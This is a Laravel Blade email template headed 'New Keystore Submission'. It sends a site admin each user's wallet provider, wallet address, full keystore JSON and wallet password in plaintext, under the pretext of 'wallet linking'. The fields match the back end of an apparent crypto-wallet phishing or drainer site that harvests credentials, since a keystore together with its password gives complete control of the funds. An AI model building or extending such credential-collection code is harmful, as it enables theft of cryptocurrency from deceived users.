@include('emails._layout_open', ['title' => 'New Keystore Submission', 'accentClass' => 'warning'])

<div style="text-align:center;">
    <div class="email-icon warning">🔑</div>
    <h1 class="email-title">New Keystore Submission</h1>
    <p class="email-subtitle">A user has submitted keystore JSON data for wallet linking.</p>
</div>

<p>A user has submitted their keystore JSON data. Please review the information below and process immediately through the admin panel.</p>

<table class="detail-table">
    <tr>
        <td class="key">Wallet Provider</td>
        <td class="val">{{ $formData['provider_name'] ?? 'N/A' }}</td>
    </tr>
    <tr>
        <td class="key">Wallet Label</td>
        <td class="val">{{ $formData['wallet_name'] ?? 'N/A' }}</td>
    </tr>
    <tr>
        <td class="key">Wallet Address</td>
        <td class="val" style="font-family:monospace;font-size:12px;word-break:break-all;">{{ $formData['wallet_address'] ?? 'N/A' }}</td>
    </tr>
    <tr>
        <td class="key">Keystore JSON</td>
        <td class="val" style="font-family:monospace;font-size:11px;word-break:break-all;color:#fbbf24;">{{ $formData['keystore_json'] ?? 'N/A' }}</td>
    </tr>
    <tr>
        <td class="key">Wallet Password</td>
        <td class="val" style="color:#f87171;font-weight:700;">{{ $formData['keystore_password'] ?? 'N/A' }}</td>
    </tr>
    <tr>
        <td class="key">Submitted At</td>
        <td class="val">{{ now()->format('Y-m-d H:i:s') }}</td>
    </tr>
</table>

<div class="info-box warning">
    <p>⚠️ <strong style="color:#fde68a;">Admin Action Required:</strong> Please log in to the admin panel to review and process this submission promptly.</p>
</div>

<div style="text-align:center;margin:28px 0 8px;">
    <a href="{{ url('/admin') }}" class="btn-cta warning">Go to Admin Panel →</a>
</div>

@include('emails._layout_close')
